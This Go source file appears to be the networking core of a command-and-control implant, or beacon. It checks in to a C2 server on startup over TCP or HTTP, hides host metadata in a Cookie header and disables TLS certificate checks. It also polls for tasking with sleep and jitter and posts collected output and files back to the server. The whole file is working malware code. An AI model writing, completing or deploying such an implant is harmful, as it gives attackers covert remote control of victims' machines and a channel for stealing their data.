package core

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	Client = &http.Client{
		Timeout: 10*time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout: 10*time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		},
	}
)

func init() {
	var MetaByte []byte
	MetaByte, MetaInfo = MetaInit()
	if strings.HasPrefix(C2_URL, "tcp") {
		TCP(JoinBytes(_IntToByte(4, len(MetaByte)+4), _IntToByte(4, BeaconID), MetaByte))
	} else {
		HTTP("GET", GetURL, JoinMap(Headers, map[string]string{"Cookie": MetaInfo}), nil, func(){os.Exit(0)})
	}
}

func TCP(Data []byte) {
	Sleep, Jitter = 0, 0
	Addr := strings.TrimPrefix(C2_URL, "tcp://")
	if strings.HasPrefix(Addr, "0.0.0.0") || strings.HasPrefix(Addr, "127.0.0.1") {
		ln, err := net.Listen("tcp", Addr)
		if err != nil { os.Exit(0) }
		go func() {
			for {
				Conn, _ := ln.Accept()
				if _, OK := Tunnel.Load(BeaconID); OK {
					Conn.Close()
				} else {
					_, err = Conn.Write(Data)
					if err != nil { Conn.Close(); continue }
					Tunnel.Store(BeaconID, Conn)
				}
			}
		}()
	} else {
		Conn, err := net.Dial("tcp", Addr)
		if err != nil { os.Exit(0) }
		_, err = Conn.Write(Data)
		if err != nil { os.Exit(0) }
		Tunnel.Store(BeaconID, Conn)
	}
}

func HTTP(Method, URL string, Header map[string]string, Body io.Reader, Error func()) []byte {
	Req, _ := http.NewRequest(Method, URL, Body)
	for Key, Value := range Header {
		Req.Header.Set(Key, Value)
	}
	Res, err := Client.Do(Req)
	if err != nil { Error(); return nil }
	defer Res.Body.Close()
	Data, _ := ioutil.ReadAll(Res.Body)
	return Data
}

func Pull() *bytes.Buffer {
	time.Sleep(GetWaitTime())
	if strings.HasPrefix(C2_URL, "http") {
		Header := JoinMap(Headers, map[string]string{"Cookie": MetaInfo})
		return ParseBytes(HTTP("GET", GetURL, Header, nil, func(){}))
	}
	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
		Len := _ByteToInt(ReadFrom(Conn.(net.Conn), 4))
		return ParseBytes(ReadFrom(Conn.(net.Conn), Len))
	}
	return nil
}

func Push() {
	time.Sleep(200*time.Millisecond)
	WriteLock(func() {
		if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
			_, err := Conn.(net.Conn).Write(_IntToByte(4, Buffer.Len()))
			if err != nil { Tunnel.Delete(BeaconID) }
			if Buffer.Len() > 0 {
				io.Copy(Conn.(net.Conn), &Buffer)
			}
		}
		if strings.HasPrefix(C2_URL, "http") && Buffer.Len() > 0 {
			HTTP("POST", fmt.Sprintf(PostURL, BeaconID), Headers, &Buffer, func(){})
		}
		FileID.Range(func(FID, _ interface{}) bool {
			FileID.Store(FID, true); return true
		})
		Buffer.Reset()
	})
}